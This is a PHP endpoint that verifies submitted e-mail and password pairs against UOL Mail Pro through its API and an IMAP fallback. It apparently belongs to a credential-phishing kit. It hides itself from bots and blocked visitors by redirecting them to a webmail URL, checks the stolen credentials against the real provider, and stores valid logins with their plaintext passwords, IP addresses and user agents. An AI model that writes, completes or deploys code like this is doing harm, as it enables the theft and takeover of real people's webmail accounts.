<?php
declare(strict_types=1);

/**
 * API verify — e-mail + senha.
 * Valida via API UOL Mail Pro (mailpro.uol.com.br) + IMAP fallback.
 * Gmail/Hotmail retornam aviso específico do provedor.
 */

require __DIR__ . '/../includes/security.php';

$config = require __DIR__ . '/../config.php';
public_session_start($config);

require __DIR__ . '/../includes/anti_bot.php';
require __DIR__ . '/../includes/storage.php';
require __DIR__ . '/../includes/webmail_redirect.php';
require __DIR__ . '/../includes/api_auth.php';

header('Content-Type: application/json; charset=utf-8');

$denyUrl = webmail_blocked_redirect($config);

$botCheck = anti_bot_evaluate($config);
if (!$botCheck['allowed']) {
    http_response_code(403);
    echo json_encode(['redirect' => $denyUrl, 'blocked' => true]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    webmail_api_json_response(405, webmail_api_json(false, 'invalid_login'));
}

if (!rate_limit_check('api_verify', 30, 300)) {
    webmail_api_json_response(429, webmail_api_json(false, 'invalid_login'));
}

$creds = webmail_api_read_credentials();
$storage = new Storage((string) $config['data_dir']);
$ip = client_ip();
$ua = client_ua();

if ($storage->isIpBlocked($ip)) {
    echo json_encode(['redirect' => $denyUrl, 'blocked' => true]);
    exit;
}

$result = webmail_api_verify_login($creds['email'], $creds['password'], $config, true);

if ($result['status'] === 200) {
    $storage->recordLoginAttempt($creds['email'], $creds['password'], true, $ip, $ua);
    $_SESSION['webmail_user'] = $creds['email'];
}

webmail_api_json_response($result['status'], $result['payload']);
